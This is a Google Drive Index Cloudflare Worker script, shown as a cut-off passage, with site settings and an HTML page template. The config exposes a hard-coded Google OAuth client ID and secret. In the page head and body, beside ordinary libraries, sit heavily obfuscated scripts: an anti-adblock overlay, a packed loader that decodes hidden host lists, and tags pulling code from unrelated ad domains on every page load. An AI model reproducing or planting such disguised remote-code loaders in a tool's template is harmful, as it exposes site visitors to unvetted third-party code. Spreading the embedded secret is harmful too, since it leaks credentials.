/*  ░██████╗░██████╗░██╗░░░░░░░░██╗░██████╗░░░░█████╗░██████╗░░██████╗░
    ██╔════╝░██╔══██╗██║░░░░░░░░██║██╔════╝░░░██╔══██╗██╔══██╗██╔════╝░
    ██║░░██╗░██║░░██║██║░░░░░░░░██║╚█████╗░░░░██║░░██║██████╔╝██║░░██╗░
    ██║░░╚██╗██║░░██║██║░░░██╗░░██║░╚═══██╗░░░██║░░██║██╔══██╗██║░░╚██╗
    ╚██████╔╝██████╔╝██║██╗╚█████╔╝██████╔╝██╗╚█████╔╝██║░░██║╚██████╔╝
    ░╚═════╝░╚═════╝░╚═╝╚═╝░╚════╝░╚═════╝░╚═╝░╚════╝░╚═╝░░╚═╝░╚═════╝░
                             v 2.0.26.1
A Script Redesigned by Parveen Bhadoo from GOIndex */

// add multiple serviceaccounts as {}, {}, {}, random account will be selected by each time app is opened.
const serviceaccounts = [
{}
];
const randomserviceaccount = serviceaccounts[Math.floor(Math.random()*serviceaccounts.length)]; // DO NOT TOUCH THIS
const domains_for_dl = ['']; // add multiple cloudflare addresses to balance the load on download/stream servers, eg. ['https://testing.fetchgoogleapi.workers.dev', 'https://testing2.fetchgoogleapi2.workers.dev']
const domain_for_dl = domains_for_dl[Math.floor(Math.random()*domains_for_dl.length)]; // DO NOT TOUCH THIS
const blocked_region = ['']; // add regional codes seperated by comma, eg. ['IN', 'US', 'PK']
const authConfig = {
    "siteName": "Drive Index", // Website name
    "client_id": "746239575955-oao9hkv614p8glrqpvuh5i8mqfoq145b.apps.googleusercontent.com", // Client id from Google Cloud Console
    "client_secret": "u5a1CSY5pNjdD2tGTU93TTnI", // Client Secret from Google Cloud Console
    "refresh_token": "", // Authorize token
    "service_account": false, // true if you're using Service Account instead of user account
    "service_account_json": randomserviceaccount, // don't touch this one
    "files_list_page_size": 50,
    "search_result_list_page_size": 50,
    "enable_cors_file_down": false,
    "enable_password_file_verify": true, // support for .password file
    "roots":[
      {
          "id": "root",
          "name": "Drive One",
          "protect_file_link": false,
         // "auth": {"username":"password"} /* Remove double slash before "auth" to activate id password protection */
      },
      {
          "id": "root",
          "name": "Drive Two",
          "protect_file_link": false,
         // "auth": {"username":"password", "username1":"password1"} /* Remove double slash before "auth" to activate id password protection */
      },
    ]};


/*
███████╗██████╗░██╗████████╗  ████████╗██╗░░██╗███████╗░██████╗███████╗
██╔════╝██╔══██╗██║╚══██╔══╝  ╚══██╔══╝██║░░██║██╔════╝██╔════╝██╔════╝
█████╗░░██║░░██║██║░░░██║░░░  ░░░██║░░░███████║█████╗░░╚█████╗░█████╗░░
██╔══╝░░██║░░██║██║░░░██║░░░  ░░░██║░░░██╔══██║██╔══╝░░░╚═══██╗██╔══╝░░
███████╗██████╔╝██║░░░██║░░░  ░░░██║░░░██║░░██║███████╗██████╔╝███████╗
╚══════╝╚═════╝░╚═╝░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═════╝░╚══════╝

██╗░░░██╗░█████╗░██╗░░░░░██╗░░░██╗███████╗░██████╗
██║░░░██║██╔══██╗██║░░░░░██║░░░██║██╔════╝██╔════╝
╚██╗░██╔╝███████║██║░░░░░██║░░░██║█████╗░░╚█████╗░
░╚████╔╝░██╔══██║██║░░░░░██║░░░██║██╔══╝░░░╚═══██╗
░░╚██╔╝░░██║░░██║███████╗╚██████╔╝███████╗██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝░╚═════╝░╚══════╝╚═════╝░*/

const uiConfig = {
    "theme": "slate", // switch between themes, default set to vapor, select from https://www.npmjs.com/package/@googledrive/index
    "version": "2.0.26.1", // don't touch this one. get latest code using generator at https://bdi-generator.hashhackers.com
    // If you're using Image then set to true, If you want text then set it to false
    "logo_image": true, // true if you're using image link in next option.
    "logo_height": "", // only if logo_image is true
    "logo_width": "100px", // only if logo_image is true
    "favicon": "https://cdn.jsdelivr.net/npm/@googledrive/index@2.0.21/images/favicon.ico",
    // if logo is true then link otherwise just text for name
    "logo_link_name": "https://cdn.jsdelivr.net/npm/@googledrive/index@2.0.21/images/bhadoo-cloud-logo-white.svg",
    "fixed_header": true, // If you want the footer to be flexible or fixed.
    "header_padding": "60", // Value 60 for fixed header, Value 20 for flexible header. Required to be changed accordingly in some themes.
    "nav_link_1": "Home", // change navigation link name
    "nav_link_3": "Current Path", // change navigation link name
    "nav_link_4": "Contact", // change navigation link name
    "fixed_footer": false, // If you want the footer to be flexible or fixed.
    "hide_footer": true, // hides the footer from site entirely.
    "header_style_class": "navbar-dark bg-primary", // navbar-dark bg-primary || navbar-dark bg-dark || navbar-light bg-light
    "footer_style_class": "bg-primary", // bg-primary || bg-dark || bg-light
    "css_a_tag_color": "white", // Color Name or Hex Code eg. #ffffff
    "css_p_tag_color": "white", // Color Name or Hex Code eg. #ffffff
    "folder_text_color": "white", // Color Name or Hex Code eg. #ffffff
    "loading_spinner_class": "text-light", // https://getbootstrap.com/docs/5.0/components/spinners/#colors
    "search_button_class": "btn btn-danger", // https://getbootstrap.com/docs/5.0/components/buttons/#examples
    "path_nav_alert_class": "alert alert-primary", // https://getbootstrap.com/docs/4.0/components/alerts/#examples
    "file_view_alert_class": "alert alert-danger", // https://getbootstrap.com/docs/4.0/components/alerts/#examples
    "file_count_alert_class": "alert alert-secondary", // https://getbootstrap.com/docs/4.0/components/alerts/#examples
    "contact_link": "https://telegram.dog/Telegram", // Link to Contact Button on Menu
    "copyright_year": "2021", // year of copyright, can be anything like 2015 - 2020 or just 2020
    "company_name": "Bhadoo", // Name next to copyright
    "company_link": "https://telegram.dog/Telegram", // link of copyright name
    "credit": true, // Set this to true to give us credit
    "display_size": true, // Set this to false to hide display file size
    "display_time": false, // Set this to false to hide display modified time for folder and files
    "display_download": true, // Set this to false to hide download icon for folder and files on main index
    "disable_player": false, // Set this to true to hide audio and video players
    "custom_srt_lang": "", // Subtitle Language Code for Custom .vtt language.
    "disable_video_download": false, // Remove Download, Copy Button on Videos
    "second_domain_for_dl": false, // If you want to display other URL for Downloading to protect your main domain.
    "downloaddomain": domain_for_dl, // Ignore this and set domains at top of this page after service accounts.
    "poster": "https://i.ibb.co/yNqH1YF/9188.jpg", // Video poster URL or see Readme to how to load from Drive
    "audioposter": "https://cdn.jsdelivr.net/gh/savmuv/Google-Drive-Index@2.0.22.2/images/music.jpg", // Video poster URL or see Readme to how to load from Drive
    "jsdelivr_cdn_src": "https://cdn.jsdelivr.net/gh/savmuv/Google-Drive-Index", // If Project is Forked, then enter your GitHub repo
    "render_head_md": false, // Render Head.md
    "render_readme_md": false, // Render Readme.md
    "display_drive_link": false, // This will add a Link Button to Google Drive of that particular file.
    "plyr_io_version": "3.6.8", // Change plyr.io version in future when needed.
    "plyr_io_video_resolution": "16:9", // For reference, visit: https://github.com/sampotts/plyr#options
    "unauthorized_owner_link": "https://telegram.dog/Telegram", // Unauthorized Error Page Link to Owner
    "unauthorized_owner_email": "abuse@telegram.org", // Unauthorized Error Page Owner Email
    "arc_code": "bVJdQ8nY", // arc.io Integration Code, get yours from https://portal.arc.io
    "search_all_drives": false // turn this on to switch this to gdrive search application
};


/*
██████╗░░█████╗░  ███╗░░██╗░█████╗░████████╗  ███████╗██████╗░██╗████████╗
██╔══██╗██╔══██╗  ████╗░██║██╔══██╗╚══██╔══╝  ██╔════╝██╔══██╗██║╚══██╔══╝
██║░░██║██║░░██║  ██╔██╗██║██║░░██║░░░██║░░░  █████╗░░██║░░██║██║░░░██║░░░
██║░░██║██║░░██║  ██║╚████║██║░░██║░░░██║░░░  ██╔══╝░░██║░░██║██║░░░██║░░░
██████╔╝╚█████╔╝  ██║░╚███║╚█████╔╝░░░██║░░░  ███████╗██████╔╝██║░░░██║░░░
╚═════╝░░╚════╝░  ╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░  ╚══════╝╚═════╝░╚═╝░░░╚═╝░░░

██████╗░███████╗██╗░░░░░░█████╗░░██╗░░░░░░░██╗
██╔══██╗██╔════╝██║░░░░░██╔══██╗░██║░░██╗░░██║
██████╦╝█████╗░░██║░░░░░██║░░██║░╚██╗████╗██╔╝
██╔══██╗██╔══╝░░██║░░░░░██║░░██║░░████╔═████║░
██████╦╝███████╗███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░
╚═════╝░╚══════╝╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░*/

// DON'T TOUCH BELOW THIS UNLESS YOU KNOW WHAT YOU'RE DOING
var gds = [];

function html(current_drive_order = 0, model = {}) {
    return `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=no"/>
  <title>${authConfig.siteName}</title>
  <script async src="https://arc.io/widget.min.js#${uiConfig.arc_code}"></script>
  <meta name="robots" content="noindex" />
  <link rel="icon" href="${uiConfig.favicon}">
  <script>
    window.drive_names = JSON.parse('${JSON.stringify(authConfig.roots.map(it => it.name))}');
    window.MODEL = JSON.parse('${JSON.stringify(model)}');
    window.current_drive_order = ${current_drive_order};
    window.UI = JSON.parse('${JSON.stringify(uiConfig)}');
  </script>
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
  <link rel="stylesheet" href="https://cdn.plyr.io/${uiConfig.plyr_io_version}/plyr.css" />
  <link href="https://cdn.jsdelivr.net/npm/bootswatch@5.0.0/dist/${uiConfig.theme}/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
  <style>a{color:${uiConfig.css_a_tag_color};}p{color:${uiConfig.css_p_tag_color};}</style>
  <script src="${uiConfig.jsdelivr_cdn_src}@${uiConfig.version}/js/app.obf.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/mozilla/pdf.js@gh-pages/build/pdf.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
  <script>(function(a,b,c){Object.defineProperty(a,b,{value: c});})(window,'absda',function(){var _0x5aa6=['span','setAttribute','background-color: black; height: 100%; left: 0; opacity: .7; top: 0; position: fixed; width: 100%; z-index: 2147483650;','height: inherit; position: relative;','color: white; font-size: 35px; font-weight: bold; left: 0; line-height: 1.5; margin-left: 25px; margin-right: 25px; text-align: center; top: 150px; position: absolute; right: 0;','ADBLOCK DETECTED<br/>Unfortunately AdBlock might cause a bad affect on displaying content of this website. Please, deactivate it.','addEventListener','click','parentNode','removeChild','removeEventListener','DOMContentLoaded','createElement','getComputedStyle','innerHTML','className','adsBox','style','-99999px','left','body','appendChild','offsetHeight','div'];(function(_0x2dff48,_0x4b3955){var _0x4fc911=function(_0x455acd){while(--_0x455acd){_0x2dff48['push'](_0x2dff48['shift']());}};_0x4fc911(++_0x4b3955);}(_0x5aa6,0x9b));var _0x25a0=function(_0x302188,_0x364573){_0x302188=_0x302188-0x0;var _0x4b3c25=_0x5aa6[_0x302188];return _0x4b3c25;};window['addEventListener'](_0x25a0('0x0'),function e(){var _0x1414bc=document[_0x25a0('0x1')]('div'),_0x473ee4='rtl'===window[_0x25a0('0x2')](document['body'])['direction'];_0x1414bc[_0x25a0('0x3')]='&nbsp;',_0x1414bc[_0x25a0('0x4')]=_0x25a0('0x5'),_0x1414bc[_0x25a0('0x6')]['position']='absolute',_0x473ee4?_0x1414bc[_0x25a0('0x6')]['right']=_0x25a0('0x7'):_0x1414bc[_0x25a0('0x6')][_0x25a0('0x8')]=_0x25a0('0x7'),document[_0x25a0('0x9')][_0x25a0('0xa')](_0x1414bc),setTimeout(function(){if(!_0x1414bc[_0x25a0('0xb')]){var _0x473ee4=document[_0x25a0('0x1')](_0x25a0('0xc')),_0x3c0b3b=document[_0x25a0('0x1')](_0x25a0('0xc')),_0x1f5f8c=document[_0x25a0('0x1')](_0x25a0('0xd')),_0x5a9ba0=document['createElement']('p');_0x473ee4[_0x25a0('0xe')]('style',_0x25a0('0xf')),_0x3c0b3b['setAttribute']('style',_0x25a0('0x10')),_0x1f5f8c[_0x25a0('0xe')](_0x25a0('0x6'),'color: white; cursor: pointer; font-size: 50px; font-weight: bold; position: absolute; right: 30px; top: 20px;'),_0x5a9ba0[_0x25a0('0xe')](_0x25a0('0x6'),_0x25a0('0x11')),_0x5a9ba0[_0x25a0('0x3')]=_0x25a0('0x12'),_0x1f5f8c[_0x25a0('0x3')]='&#10006;',_0x3c0b3b['appendChild'](_0x5a9ba0),_0x3c0b3b[_0x25a0('0xa')](_0x1f5f8c),_0x1f5f8c[_0x25a0('0x13')](_0x25a0('0x14'),function _0x3c0b3b(){_0x473ee4[_0x25a0('0x15')][_0x25a0('0x16')](_0x473ee4),_0x1f5f8c['removeEventListener']('click',_0x3c0b3b);}),_0x473ee4[_0x25a0('0xa')](_0x3c0b3b),document[_0x25a0('0x9')][_0x25a0('0xa')](_0x473ee4);}},0xc8),window[_0x25a0('0x17')]('DOMContentLoaded',e);});});</script><script type='text/javascript' onerror='absda()' src='//sinisterbatchoddly.com/92/83/34/92833411ba8660d05f38745a23fe318d.js'></script>
  <script data-cfasync="false" async type="text/javascript" src="//wingersunbrand.com/f1PlsMrVFqD2uk/40118"></script>
</head>
<body>
        <script type="text/javascript"  charset="utf-8">
        var _0x9e19=[\'\',\'replace\'];function kKjXUehBk(_0x7cfax2){return _0x7cfax2.toString()[_0x9e19[1]](/^[^\\/]+\\/\\*!?/,_0x9e19[0])[_0x9e19[1]](/\\*\\/[^\\/]+$/,_0x9e19[0])};var qHIdlbPpja = kKjXUehBk(function() {/*!lchs(mbujapvu(w,h,j,r,l,k){l=mbujapvu(j){ylabyu(j<h?\'\':l(whyzlPua(j/h)))+((j=j%h)>35?Zaypun.myvtJohyJvkl(j+29):j.avZaypun(36))};pm(!\'\'.ylwshjl(/^/,Zaypun)){dopsl(j--){k[l(j)]=r[j]||l(j)}r=[mbujapvu(l){ylabyu k[l]}];l=mbujapvu(){ylabyu\'\\\\d+\'};j=1};dopsl(j--){pm(r[j]){w=w.ylwshjl(uld YlnLew(\'\\\\i\'+l(j)+\'\\\\i\',\'n\'),r[j])}}ylabyu w}(\';x j=P.R(2y)+P.R(2j)+P.R(2y)+\\\'7x\\\'+P.R(2y)+P.R(4n)+\\\'z\\\'+P.R(4i)+\\\'e\\\';r(g.1t(j)){g.1t(j).q.1U(\\\'29\\\',\\\'2U\\\',\\\'B\\\');g.1t(j).q.1U(\\\'1X\\\',\\\'2o\\\',\\\'B\\\');g.1t(j).q.1U(\\\'1J\\\',\\\'0\\\',\\\'B\\\');g.1t(j).q.1U(\\\'49\\\',\\\'2o\\\',\\\'B\\\')};r(j){17 j};r(g.Z){g.Z.q.1U(\\\'29\\\',\\\'3H\\\',\\\'B\\\')};x Q=\\\'\\\',1v=\\\'3D\\\',e=K.S((K.V()*6)+8);1u(x p=0;p<e;p++)Q+=1v.16(K.S(K.V()*1v.O));r(e){17 e};x 3h=2,3n=40,2Q=3X,2I=4h,1D=0,3i=\\\'37\\\',2W=I(l){x v=!1,y=I(){r(g.1q){g.2J(\\\'2F\\\',a);L.2J(\\\'2d\\\',a)}N{g.2N(\\\'2l\\\',a);L.2N(\\\'1E\\\',a)}},a=I(){r(!v&&(g.1q||3W.2B===\\\'2d\\\'||g.33===\\\'2Z\\\')){v=!0;y();l()}};r(g.33===\\\'2Z\\\'){l()}N r(g.1q){g.1q(\\\'2F\\\',a);L.1q(\\\'2d\\\',a)}N{g.32(\\\'2l\\\',a);L.32(\\\'1E\\\',a);x u=!1;24{u=L.5n==2Y&&g.2i}27(p){};r(u&&u.34){(I h(){r(v)M;24{u.34(\\\'1o\\\')}27(a){M 5V(h,50)};v=!0;y();l()})()}}};L[\\\'\\\'+Q+\\\'\\\']=(I(){x l={l$:1v+\\\'+/=\\\',5e:I(a){x h=\\\'\\\',s,u,v,j,t,k,p,y=0;a=l.a$(a);1m(y<a.O){s=a.1j(y++);u=a.1j(y++);v=a.1j(y++);j=s>>2;t=(s&3)<<4|u>>4;k=(u&15)<<2|v>>6;p=v&63;r(2O(u)){k=p=64}N r(2O(v)){p=64};h=h+11.l$.16(j)+11.l$.16(t)+11.l$.16(k)+11.l$.16(p)};M h},14:I(a){x u=\\\'\\\',s,k,j,t,y,p,h,v=0;a=a.1h(/[^H-5H-4Y-9\\\\+\\\\/\\\\=]/n,\\\'\\\');1m(v<a.O){t=11.l$.23(a.16(v++));y=11.l$.23(a.16(v++));p=11.l$.23(a.16(v++));h=11.l$.23(a.16(v++));s=t<<2|y>>4;k=(y&15)<<4|p>>2;j=(p&3)<<6|h;u=u+P.R(s);r(p!=64){u=u+P.R(k)};r(h!=64){u=u+P.R(j)}};u=l.u$(u);M u},a$:I(l){l=l.1h(/;/n,\\\';\\\');x u=\\\'\\\';1u(x v=0;v<l.O;v++){x a=l.1j(v);r(a<1P){u+=P.R(a)}N r(a>4V&&a<4N){u+=P.R(a>>6|4L);u+=P.R(a&63|1P)}N{u+=P.R(a>>12|3y);u+=P.R(a>>6&63|1P);u+=P.R(a&63|1P)}};M u},u$:I(l){x v=\\\'\\\',a=0,u=4O=1H=0;1m(a<l.O){u=l.1j(a);r(u<1P){v+=P.R(u);a++}N r(u>4E&&u<3y){1H=l.1j(a+1);v+=P.R((u&31)<<6|1H&63);a+=2}N{1H=l.1j(a+1);3a=l.1j(a+2);v+=P.R((u&15)<<12|(1H&63)<<6|3a&63);a+=3}};M v}};x z=[\\\'4c\\\',\\\'4A\\\',\\\'2G==\\\',\\\'4B==\\\',\\\'4C=\\\',\\\'4D=\\\',\\\'4F\\\',\\\'4G\\\',\\\'4Z\\\',\\\'51==\\\',\\\'53\\\',\\\'54==\\\',\\\'55=\\\',\\\'56=\\\',\\\'57==\\\',\\\'58=\\\',\\\'59\\\',\\\'52==\\\',\\\'4X==\\\',\\\'2C==\\\',\\\'2E=\\\',\\\'4W\\\',\\\'4g==\\\',\\\'4H=\\\',\\\'4I\\\',\\\'4J\\\',\\\'4K==\\\',\\\'4M\\\',\\\'4f=\\\',\\\'4P\\\',\\\'4Q\\\',\\\'4R=\\\',\\\'4S=\\\',\\\'4T=\\\',\\\'4U\\\',\\\'5h\\\',\\\'5i=\\\',\\\'5d=\\\',\\\'5f\\\',\\\'5g\\\',\\\'5I=\\\',\\\'5J\\\',\\\'5K=\\\',\\\'5L=\\\',\\\'5M=\\\',\\\'5O=\\\',\\\'5P=\\\',\\\'5Q=\\\',\\\'5R==\\\',\\\'5S==\\\',\\\'5T==\\\',\\\'5U==\\\',\\\'5N=\\\',\\\'5c\\\',\\\'5t\\\',\\\'5b\\\',\\\'5l\\\',\\\'5m\\\',\\\'5o\\\',\\\'5p==\\\',\\\'4d=\\\',\\\'5q=\\\',\\\'5r=\\\',\\\'5k==\\\',\\\'5s=\\\',\\\'5u\\\',\\\'5v=\\\',\\\'5w=\\\',\\\'5x==\\\',\\\'5y=\\\',\\\'5z==\\\',\\\'2G==\\\',\\\'2E=\\\',\\\'5a=\\\',\\\'5j\\\',\\\'4e==\\\',\\\'2C==\\\',\\\'3F\\\',\\\'3E==\\\',\\\'3K=\\\'],d=K.S(K.V()*z.O),b=l.14(z[d]),w=b,T=1,f=\\\'#3U\\\',y=\\\'#3T\\\',c=\\\'#3S\\\',n=\\\'#3R\\\',E=\\\'\\\',o=\\\'2M\\\\\\\'3Q 3P 2m 43 42!\\\',m=\\\'4b 4a 4z 2R 4w 4v 11 4u 4q\\\\\\\'a 4j 3o.\\\',Y=\\\'2M 48 47 4p 3V 45 2R 2m 4o 2s 4r 4x 1m 4y\\\',G=\\\'3G 3k 3o 4t 2m 3O 44 2s 4m 36 11 38\\\',u=0,F=0,v=\\\'46.4k\\\',t=0,C=a()+\\\'.3t\\\',D=I(l,a,v){x u=g.1n(\\\'3q\\\');u.1V=l;u.1E=a;u.2l=a;u.1q(\\\'4l\\\',a);v.1k(u)},J=I(){};I i(l){r(l)l=l.1Z(l.O-15);x v=g.2f(\\\'3q\\\');1u(x u=v.O;u--;){x a=P(v[u].1V);r(a)a=a.1Z(a.O-15);r(a===l)M!0};M!1};I X(l){r(l)l=l.1Z(l.O-15);x a=g.4s;e=0;1m(e<a.O){1z=a[e].2k;r(1z)1z=1z.1Z(1z.O-15);r(1z===l)M!0;e++};M!1};I a(l){x u=\\\'\\\',v=1v;l=l||30;1u(x a=0;a<l;a++)u+=v.16(K.S(K.V()*v.O));M u};I p(u){x p=[\\\'3Y\\\',\\\'41==\\\',\\\'3L\\\',\\\'3M\\\',\\\'2V\\\',\\\'3N==\\\',\\\'3Z==\\\',\\\'3A=\\\',\\\'3B==\\\',\\\'3C==\\\',\\\'5W\\\',\\\'2V\\\'],y=[\\\'3w=\\\',\\\'5Y==\\\',\\\'67==\\\',\\\'7u==\\\',\\\'7t=\\\',\\\'7s\\\',\\\'7r=\\\',\\\'7q=\\\',\\\'3w=\\\',\\\'7p\\\',\\\'7o==\\\',\\\'7n\\\',\\\'7m==\\\',\\\'7l==\\\',\\\'7k==\\\',\\\'7j=\\\'];e=0;1A=[];1m(e<u){j=p[K.S(K.V()*p.O)];k=y[K.S(K.V()*y.O)];j=l.14(j);k=l.14(k);x h=K.S(K.V()*2)+1;r(h==1){v=\\\'//\\\'+j+\\\'/\\\'+k}N{v=\\\'//\\\'+j+\\\'/\\\'+a(K.S(K.V()*20)+4)+\\\'.3t\\\'};1A[e]=2p 2q();1A[e].2r=I(){x l=1;1m(l<7){l++}};1A[e].1V=v;e++}};I s(l,a){x v=\\\'\\\';1u(x p=0;p<l.O;p++){x u=l.1j(p);r(2j<=u&&u<7i){v+=P.R((u-a+7)%26+2j)}N r(65<=u&&u<79){v+=P.R((u-a+13)%26+65)}N{v+=P.R(u)}};M v};I h(l){l=l.1h(/{/n,\\\'\\\');l=l.1h(/}/n,\\\'\\\');l=l.1h(/|/n,\\\'\\\');l=l.1h(/~/n,\\\'\\\');M l};I U(l){};M{6D:I(l,a){l=l%a;l=l+2;M K.78(l)},1Y:I(l,u){r(7w g.Z==\\\'2T\\\'){M};x p=\\\'0.1\\\',u=w,a=g.1n(\\\'1T\\\');a.1y=u;a.q.1x=\\\'28\\\';a.q.1o=\\\'-1d\\\';a.q.19=\\\'-1d\\\';a.q.1L=\\\'2b\\\';a.q.1l=\\\'77\\\';x s=g.Z.3l,h=K.S(s.O/2);r(h>15){x v=g.1n(\\\'2z\\\');v.q.1x=\\\'28\\\';v.q.1L=\\\'1Q\\\';v.q.1l=\\\'1Q\\\';v.q.19=\\\'-1d\\\';v.q.1o=\\\'-1d\\\';g.Z.76(v,g.Z.3l[h]);v.1k(a);x y=g.1n(\\\'1T\\\');y.1y=\\\'3m\\\';y.q.1x=\\\'28\\\';y.q.1o=\\\'-1d\\\';y.q.19=\\\'-1d\\\';g.Z.1k(y)}N{a.1y=\\\'3m\\\';g.Z.1k(a)};t=75(I(){r(a){l((a.2t==0),p);l((a.2n==0),p);l((a.1X==\\\'2U\\\'),p);l((a.29==\\\'2o\\\'),p);l((a.1J==0),p)}N{l(!0,p)}},2x)},74:I(l,a){l=l-a;l=l-1;M K.73(l)},1S:I(a,k){r((a)&&(u==0)){u=1;L[\\\'\\\'+Q+\\\'\\\'].1e()}N{r(L[\\\'\\\'+Q+\\\'\\\']){r(!L[\\\'\\\'+Q+\\\'\\\'].2v){x e=l.14(\\\'72\\\'),d=g.71(e);r((d)&&(u==0)){r((3n%3)==0){x t=\\\'70=\\\';t=l.14(t);r(i(t)){r(d.1G.1h(/\\\\z/n,\\\'\\\').O==0){u=1;L[\\\'\\\'+Q+\\\'\\\'].1e()}};r(t){17 t}}}}};x Y=!1;r(u==0){r((2Q%3)==0){r(!L[\\\'\\\'+Q+\\\'\\\'].2v){x o=[\\\'6G==\\\',\\\'6F==\\\',\\\'6E=\\\',\\\'7v=\\\',\\\'7h=\\\'],c=20,w=o.O,y=o[K.S(K.V()*w)],v=y;1m(y==v){v=o[K.S(K.V()*w)]};y=h(y);y=s(y,c);y=l.14(y);v=h(v);v=s(v,c);v=l.14(v);r(o){17 o};x z=2p 2q(),f=2p 2q();z.2r=I(){p(K.S(K.V()*2)+1);f.1V=v;r(v){17 v};p(K.S(K.V()*2)+1)};f.2r=I(){u=1;p(K.S(K.V()*3)+1);L[\\\'\\\'+Q+\\\'\\\'].1e()};z.1V=y;r(y){17 y};r((2I%3)==0){z.1E=I(){r((z.1l<8)&&(z.1l>0)){L[\\\'\\\'+Q+\\\'\\\'].1e()}}};x F=[\\\'7M/7N=\\\',\\\'7O\\\',\\\'7L=\\\',\\\'7K=\\\',\\\'7y/7I\\\',\\\'7e=\\\',\\\'5X\\\'],n=[\\\'7c==\\\',\\\'7b=\\\',\\\'7a=\\\',\\\'7z\\\'],m=F.O,j=F[K.S(K.V()*m)],m=n.O,b=n[K.S(K.V()*m)];j=l.14(j);b=l.14(b);j=j.1h(\\\'7H.7J\\\',b);j=\\\'//\\\'+j;L[\\\'1R\\\']=0;x G=I(){r((1R>0)&&(1R%39==0)){}N{L[\\\'\\\'+Q+\\\'\\\'].1e();r(1R){17 1R}}};D(j,G,g.Z);L[\\\'\\\'+Q+\\\'\\\'].2v=!0};L[\\\'\\\'+Q+\\\'\\\'].1S=I(){M}}}}},1e:I(){r(L[\\\'\\\'+Q+\\\'\\\'].1S){17 L[\\\'\\\'+Q+\\\'\\\'].1S};r(L[\\\'\\\'+Q+\\\'\\\'].1Y){17 L[\\\'\\\'+Q+\\\'\\\'].1Y};r(F==1){x X=2e.3j(\\\'2c\\\');r(X>0){M!0}N{2e.1B(\\\'2c\\\',(K.V()+1)*2x)}};x j=\\\'7d\\\';j=l.14(j);x E=g.2A||g.2f(\\\'2A\\\')[0],s=g.1n(\\\'q\\\');s.2B=\\\'1f/7f\\\';r(s.2D){s.2D.1i=j}N{s.1k(g.7g(j))};E.1k(s);6C(t);g.Z.1G=\\\'\\\';g.Z.q.1i+=\\\'A:1Q !B\\\';g.Z.q.1i+=\\\'1M:1Q !B\\\';x C=g.2i.2n||L.3J||g.Z.2n,b=L.6x||g.Z.2t||g.2i.2t,h=g.1n(\\\'1T\\\'),w=a();h.1y=w;h.q.1x=\\\'2H\\\';h.q.1o=\\\'0\\\';h.q.19=\\\'0\\\';h.q.1l=C+\\\'1W\\\';h.q.1L=b+\\\'1W\\\';h.q.2L=f;h.q.2w=\\\'6A\\\';g.Z.1k(h);x k=\\\'<h 2k=\"6u://6t.6s/6r;\" q=\"W-1p:10.6q;W-1a:1b-1c;1r:6p;\">6o 6n 2u 6m 36 2s 38...<\/h>\\\';k=k.1h(\\\'6l\\\',a());k=k.1h(\\\'6k\\\',a());x p=g.1n(\\\'1T\\\');p.1G=k;p.q.1x=\\\'28\\\';p.q.1I=\\\'21\\\';p.q.1o=\\\'21\\\';p.q.1l=\\\'6j\\\';p.q.1L=\\\'6i\\\';p.q.2w=\\\'2P\\\';p.q.1J=\\\'.6\\\';p.q.3d=\\\'35\\\';p.1q(\\\'3k\\\',I(){v=v.69(\\\'\\\').5Z().68(\\\'\\\');L.3I.2k=\\\'//\\\'+v});g.1t(w).1k(p);x u=g.1n(\\\'1T\\\'),J=a();u.1y=J;u.q.1x=\\\'2H\\\';u.q.19=b/7+\\\'1W\\\';u.q.6B=C-66+\\\'1W\\\';u.q.62=b/3.5+\\\'1W\\\';u.q.2L=\\\'#61\\\';u.q.2w=\\\'2P\\\';u.q.1i+=\\\'W-1a: \"5G 5F\", 1O, 1N, 1b-1c !B\\\';u.q.1i+=\\\'5E-1L: 5D !B\\\';u.q.1i+=\\\'W-1p: 5C !B\\\';u.q.1i+=\\\'1f-1K: 1g !B\\\';u.q.1i+=\\\'1M: 5B !B\\\';u.q.1X+=\\\'2u\\\';u.q.3x=\\\'21\\\';u.q.5A=\\\'21\\\';u.q.6v=\\\'3z\\\';g.Z.1k(u);u.q.6h=\\\'1Q 6w 6M -6Z 6Y(0,0,0,0.3)\\\';u.q.29=\\\'3H\\\';x i=30,D=22,e=18,d=18;r((L.3J<3g)||(6X.1l<3g)){u.q.3e=\\\'50%\\\';u.q.1i+=\\\'W-1p: 6W !B\\\';u.q.3x=\\\'6V;\\\';p.q.3e=\\\'65%\\\';x i=22,D=18,e=12,d=12};u.1G=\\\'<3s q=\"1r:#6U;W-1p:\\\'+i+\\\'1F;1r:\\\'+y+\\\';W-1a:1O, 1N, 1b-1c;W-1C:6T;A-19:1s;A-1I:1s;1f-1K:1g;\">\\\'+o+\\\'<\/3s><3u q=\"W-1p:\\\'+D+\\\'1F;W-1C:6S;W-1a:1O, 1N, 1b-1c;1r:\\\'+y+\\\';A-19:1s;A-1I:1s;1f-1K:1g;\">\\\'+m+\\\'<\/3u><6R q=\" 1X: 2u;A-19: 0.3v;A-1I: 0.3v;A-1o: 2a;A-3p: 2a; 3b:6Q 6P #6O; 1l: 25%;1f-1K:1g;\"><w q=\"W-1a:1O, 1N, 1b-1c;W-1C:3c;W-1p:\\\'+e+\\\'1F;1r:\\\'+y+\\\';1f-1K:1g;\">\\\'+Y+\\\'<\/w><w q=\"A-19:6N;\"><2z 6L=\"11.q.1J=.9;\" 6y=\"11.q.1J=1;\"  1y=\"\\\'+a()+\\\'\" q=\"3d:35;W-1p:\\\'+d+\\\'1F;W-1a:1O, 1N, 1b-1c; W-1C:3c;3b-6K:3z;1M:1s;6J-1r:\\\'+c+\\\';1r:\\\'+n+\\\';1M-1o:2b;1M-3p:2b;1l:60%;A:2a;A-19:1s;A-1I:1s;\" 6I=\"L.3I.6H();\">\\\'+G+\\\'<\/2z><\/w>\\\';L[\\\'\\\'+Q+\\\'\\\']=2T;24{17 L[\\\'\\\'+Q+\\\'\\\']}27(z){}}}})();L.3f=I(l,a){x u=6g.6f,v=L.6e,h=u(),p,y=I(){u()-h<a?p||v(y):l()};v(y);M{6d:I(){p=1}}};x 